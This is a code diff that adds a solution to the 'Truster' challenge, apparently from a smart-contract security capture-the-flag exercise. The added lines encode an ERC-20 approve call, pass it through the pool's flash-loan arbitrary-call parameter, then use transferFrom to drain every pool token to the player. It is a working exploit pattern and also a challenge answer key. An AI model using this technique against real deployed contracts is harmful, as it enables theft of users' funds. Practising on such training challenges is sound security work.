@@ -23,6 +23,15 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        //creating the interface for the function approve
+        let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount )"]);
+        let data = interface.encodeFunctionData("approve",[player.address, TOKENS_IN_POOL]);
+
+        
+        //calling the flash loan function in the pool contract
+        await pool.connect(player).flashLoan(0, player.address, token.address, data);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
